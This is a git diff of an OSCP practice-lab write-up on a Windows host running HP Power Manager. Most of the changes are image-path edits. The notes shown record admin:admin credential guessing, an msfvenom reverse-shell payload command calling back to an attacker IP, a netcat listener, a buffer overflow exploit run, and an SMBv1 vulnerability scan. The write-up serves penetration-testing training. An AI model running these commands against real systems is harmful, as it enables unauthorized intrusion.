@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-24
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Easy
@@ -101,26 +102,26 @@ Host script results:
 No enumeration conducted
 ## Port 80 - HTTP (Apache)
 - Navigated to `http://192.168.242.45:80` and identified `HP Power Manager`
-![[Pasted image 20241024204921.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241024204921.png]]
 - Password guessed credentials `admin:admin`
-![[Pasted image 20241024205102.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241024205102.png]]
 - Clicked "Logs" tab, navigated to `http://192.168.242.45/Contents/index.asp` and identified application logs
-![[Pasted image 20241024213408.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241024213408.png]]
 - Ran `searchsploit "HP Power Manager"` and identified potential exploit `10099.py`
-![[Pasted image 20241024221345.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241024221345.png]]
 - Reviewed `10099.py` code, then ran `msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.199 LPORT=80 -e x86/alpha_mixed -f c` to generate reverse shell for buffer overflow
-![[Pasted image 20241025163857.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025163857.png]]
 - Copied buffer overflow into `10099.py` below "n00bn00b" line to replace existing code
-![[Pasted image 20241025164015.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025164015.png]]
 - Saved `10099.py`, ran `nc -nvlp 80` to start netcat listener on port `80`, then ran exploit `python2 10099.py 192.168.171.45`
-![[Pasted image 20241025164155.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025164155.png]]
 - No reverse shell received
-![[Pasted image 20241025164223.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025164223.png]]
 ## Port 135 - MSRPC (Windows RPC)
 
 ## Port 139 & 445 - SMB (Apache)
 - Ran `sudo nmap --script smb-vuln* -p 139,445 192.168.242.45` and identified SMBv1 vulnerability (CVE-2017-0143)
-![[Pasted image 20241024220205.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241024220205.png]]
 ## Port 3389 - RDP
 
 ## Port 49152-60 - MSRPC (Windows RPC)
